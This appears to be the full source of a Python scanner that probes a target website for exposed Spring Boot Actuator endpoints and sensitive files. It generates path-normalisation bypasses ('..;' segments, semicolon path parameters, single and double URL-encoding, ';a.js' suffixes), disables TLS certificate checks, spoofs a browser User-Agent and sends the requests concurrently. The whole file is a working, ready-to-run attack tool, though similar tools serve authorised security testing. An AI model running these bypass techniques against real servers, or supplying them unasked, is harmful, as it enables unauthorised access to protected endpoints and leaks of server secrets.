import argparse
import logging
import asyncio
import difflib
import itertools
import random
import ssl
import string
import warnings
import http.cookies
import hashlib
from urllib.parse import urljoin

import aiohttp
from colorama import Fore

# skip charset_normalizer warning
warnings.filterwarnings("ignore", category=UserWarning, module='charset_normalizer')

# fix cookie error: illegal key
http.cookies._is_legal_key = lambda _: True

# Timeout configuration
TIMEOUT = 3

# Global counter
tried_requests_counter = 0
counter_lock = asyncio.Lock()

# store responses of each sensitive_url
diff_sensitive_responses = {}

# A new global dictionary for storing the content of each base_url
base_url_contents = {}

# logger configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


async def check_path_exists(base_url, path, session, semaphore, not_found_indicator):
    """
    Check valid path
    """
    if not not_found_indicator:
        return False

    url = urljoin(base_url, path)
    async with semaphore:
        try:
            timeout = aiohttp.ClientTimeout(total=TIMEOUT)
            async with session.get(url, timeout=timeout) as response:
                try:
                    text = await response.text()
                    if not text:
                        return False
                except UnicodeDecodeError:
                    # pass
                    return False

                similarity = difflib.SequenceMatcher(None, text, not_found_indicator).ratio()
                # compare similarity
                return similarity < 0.9
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.debug(f"[-] An error occurred while checking {url}: {type(e).__name__} - {e}")
            return False


def generate_bypass_rules(normal_path):
    """
    Set of bypass rules
    """
    segments = normal_path.strip("/").split("/")
    # Rules based on path matching ..;
    max_dots = len(segments) + 1
    bypass_rules = ["/".join(["..;"] * i) for i in range(max_dots + 1)]

    random_chars = "".join(random.choices(string.ascii_lowercase, k=3))
    # Path addition /;/ Random character rules
    modified_rules = [rule.replace("/", f"/;{random_chars}/", 1) + f";{random_chars}" for rule in bypass_rules]
    bypass_rules.extend(modified_rules)

    # Adding '..' rules
    bypass_rules.extend(["/".join([".."] * i) for i in range(max_dots + 1)])

    # Remove duplicates in rule set
    return list(dict.fromkeys(bypass_rules))


async def get_base_url_content(base_url, session):
    """
    Get base url content
    """
    try:
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with session.get(base_url, timeout=timeout) as response:
            text = await response.text()
            return hash_text(text)
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.debug(f"[-] An error occurred while checking {base_url}: {type(e).__name__} - {e}")
        return None


def hash_text(text):
    return hashlib.md5(text.encode()).hexdigest()


async def fetch(url, session, semaphore, base_url):
    global base_url_contents
    global tried_requests_counter

    async with semaphore:
        try:
            timeout = aiohttp.ClientTimeout(total=TIMEOUT)
            async with session.get(url, timeout=timeout) as response:
                # fetch response
                text = await response.text()

                text_hash = hash_text(text)
                logger.debug(f"[DEBUG] Trying {url}")

                if base_url not in base_url_contents:
                    base_url_content = await get_base_url_content(base_url, session)
                    base_url_contents[base_url] = base_url_content
                else:
                    base_url_content = base_url_contents[base_url]

                if response.status == 200:
                    content_type = response.headers.get("Content-Type", "")
                    if "application/vnd.spring-boot" in content_type:
                        # duplicate results
                        if not diff_sensitive_responses.setdefault(text_hash, False):
                            diff_sensitive_responses[text_hash] = True
                            logger.info(Fore.RED + f"[+] Actuator endpoint found: {url}" + Fore.RESET)
                            return True
                    # a sensitive file check? Perhaps using OpenAI to check will be more accurate. :)
                    else:
                        try:
                            #  sensitive files if the content does not match the content of base_url
                            if text_hash not in diff_sensitive_responses and text != base_url_content:
                                diff_sensitive_responses[text_hash] = True
                                logger.info(
                                    Fore.YELLOW + f"[+] Sensitive File found: {url} " + Fore.RESET + Fore.CYAN + f" Length: {len(text)}" + Fore.RESET)
                                return True
                        except UnicodeDecodeError:
                            pass
                    return False
                # requests_counter
                async with counter_lock:
                    tried_requests_counter += 1
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.debug(f"[-] An error occurred while requesting {url}: {type(e).__name__} - {e}")
            return False


async def sensitive_info_detector(base_url, normal_paths, sensitive_files, concurrency, check_existence):
    """
    Main logic
    """
    # fix ssl error
    sslcontext = ssl.create_default_context()
    sslcontext.check_hostname = False
    sslcontext.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(ssl=sslcontext)

    # common headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.3",
        "Content-Type": "application/json",
        "Accept": "*/*"
    }

    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        semaphore = asyncio.Semaphore(concurrency)
        tasks = []
        checked_urls = set()

        not_found_indicator = None
        if check_existence:
            # generate a random string
            not_found_path = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
            not_found_url = urljoin(base_url, not_found_path)
            async with session.get(not_found_url, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as response:
                try:
                    not_found_indicator = await response.text()
                except UnicodeDecodeError:
                    # pass
                    not_found_indicator = ""

        for normal_path in normal_paths:
            # if normal_path is empty, then skip
            if not normal_path:
                continue
            # if check path then skip
            if check_existence and not await check_path_exists(base_url, normal_path, session, semaphore,
                                                               not_found_indicator):
                continue

            # Rule generation
            bypass_rules = generate_bypass_rules(normal_path)

            for bypass_rule, sensitive_file in itertools.product(bypass_rules, sensitive_files):
                url_path = f"{normal_path}/{bypass_rule}/{sensitive_file}".replace("//", '/')

                url = urljoin(base_url, url_path)

                if url not in checked_urls:
                    checked_urls.add(url)
                    tasks.append(fetch(url, session, semaphore, base_url))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        if not any(results):
            logger.info(f"[-] No sensitive files were found: " + Fore.GREEN + base_url + Fore.RESET)


def load_dictionary(file_path):
    """
    Import dictionary
    """
    with open(file_path, "r") as f:
        # remove empty lines
        return [line.strip() for line in f.readlines() if line.strip()]


def url_encode_all(string):
    """
    URL encoding supporting all characters
    """
    return "".join("%{:02x}".format(ord(char)) for char in string)


def apply_encoding_rules(rule):
    """
    Dicts urlencoding
    """
    if not rule:
        return []

    char_to_encode = random.choice(rule)
    encoded_char = url_encode_all(char_to_encode)
    double_encoded_char = url_encode_all(encoded_char)

    return [rule.replace(char_to_encode, encoded_char), rule.replace(char_to_encode, double_encoded_char)]


def apply_encoding_and_extend(dictionary_items, extensions=None):
    """
    Dictionary path encoding processing
    """
    encoded_items = set().union(*[apply_encoding_rules(item) for item in dictionary_items])

    extended_items = [item + ext for item in (set(dictionary_items) | encoded_items) for ext in (extensions or [""])]

    return extended_items


def parse_arguments():
    """
    Parse command line arguments
    """
    parser = argparse.ArgumentParser(description="Sensitive information detector.")
    parser.add_argument("base_url", help="The base URL to scan.")
    parser.add_argument("normal_paths_dict", help="Path to the normal paths dictionary.")
    parser.add_argument("sensitive_files_dict", help="Path to the sensitive files dictionary (optional).")
    parser.add_argument("-c", "--concurrency", type=int, default=5, help="Concurrency level (default: 5).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output.")
    parser.add_argument("-e", "--check-existence", action="store_true",
                        help="Check if the paths exist before scanning.")
    args = parser.parse_args()
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    return args


def main():
    try:
        args = parse_arguments()

        # CLI configuration
        base_url = args.base_url
        normal_paths_dict = args.normal_paths_dict
        sensitive_files_dict = args.sensitive_files_dict
        concurrency = args.concurrency
        # Import dictionaries
        normal_paths = load_dictionary(normal_paths_dict)
        sensitive_files = load_dictionary(sensitive_files_dict)

        # URL encoding
        normal_paths = apply_encoding_and_extend(normal_paths)
        # Extended suffix configuration .json , ;a.js
        sensitive_files = apply_encoding_and_extend(sensitive_files, extensions=["", ".json", ";a.js"])

        asyncio.run(sensitive_info_detector(base_url, normal_paths, sensitive_files, concurrency,
                                            args.check_existence))

    except asyncio.TimeoutError:
        pass
    finally:
        logger.debug(Fore.BLUE + f"[DEBUG] Total tried requests:" + str(tried_requests_counter) + Fore.RESET)
        pass


if __name__ == '__main__':
    main()
